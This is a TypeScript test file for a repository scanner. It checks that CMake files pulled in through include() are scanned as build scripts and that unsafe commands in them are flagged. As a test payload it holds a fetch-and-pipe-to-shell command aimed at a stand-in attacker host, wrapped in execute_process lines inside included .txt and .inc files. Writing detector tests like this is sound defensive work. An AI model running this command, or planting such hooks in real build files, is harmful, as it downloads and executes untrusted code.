import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function encode(text: string): Uint8Array {
  return new TextEncoder().encode(text);
}

function inspected(files: { path: string; text: string }[]) {
  return inspectRepository({
    files: files.map((file) => ({ path: file.path, bytes: encode(file.text) })),
  });
}

const LIST = (include: string) =>
  `cmake_minimum_required(VERSION 3.20)\nproject(demo NONE)\n${include}\n`;

test("a file pulled in by include() is scanned under its own name", () => {
  // PRD section 8: the scan checks install and build scripts. CMake evaluates
  // an included file during configure, so a `.txt` there runs commands while
  // the CMakeLists itself stays clean.
  const scan = (command: string) =>
    inspected([
      { path: "CMakeLists.txt", text: LIST("include(deps/fetch.txt)") },
      {
        path: "deps/fetch.txt",
        text: `execute_process(COMMAND sh -c "${command}")\n`,
      },
      {
        path: "nested/CMakeLists.txt",
        text: LIST('include("../deps/deep.txt")'),
      },
      {
        path: "deps/deep.txt",
        text: `execute_process(COMMAND sh -c "${command}")\n`,
      },
      { path: "tools/list.cmake", text: LIST('include("helper.inc")') },
      {
        path: "tools/helper.inc",
        text: `execute_process(COMMAND sh -c "${command}")\n`,
      },
    ]);
  const before = scan("echo safe");
  const after = scan(PAYLOAD);
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 6,
  });
  const classified = new Map(
    (
      JSON.parse(new TextDecoder().decode(after.inventory)) as {
        classifications: { path: string; surfaces: string[] }[];
      }
    ).classifications.map((entry) => [entry.path, entry.surfaces]),
  );
  for (const path of ["deps/fetch.txt", "deps/deep.txt", "tools/helper.inc"]) {
    expect(classified.get(path)).toEqual(["installScripts", "source"]);
    expect(after.findings).toContainEqual(
      expect.objectContaining({
        path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
  }
  expect(before.findings).toEqual([]);
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("include() forms that cannot be resolved keep the list file alone", () => {
  const cases = [
    `include(\${MODULES}/vars.txt)`,
    "include(/opt/shared/vars.txt)",
    "include(module_without_extension)",
    "# include(commented.txt)",
    "include(../../outside.txt)",
  ];
  for (const line of cases) {
    const inspection = inspected([
      { path: "CMakeLists.txt", text: LIST(line) },
      { path: "vars.txt", text: `set(X 1)\n` },
    ]);
    expect({ line, items: inspection.coverage.installScripts.items }).toEqual({
      line,
      items: 1,
    });
  }
});

test("a quoted path and a trailing comment still resolve", () => {
  const inspection = inspected([
    {
      path: "CMakeLists.txt",
      text: LIST('include("deps/fetch.txt") # build helper'),
    },
    {
      path: "deps/fetch.txt",
      text: `execute_process(COMMAND sh -c "${PAYLOAD}")\n`,
    },
  ]);
  expect(inspection.findings.map((finding) => finding.path)).toEqual([
    "deps/fetch.txt",
  ]);
});

test("a plain text file outside include() stays unclassified", () => {
  expect(surfacesOf("NOTES.txt")).toEqual([]);
  expect(surfacesOf("src/main.cpp")).toEqual(["source"]);
});
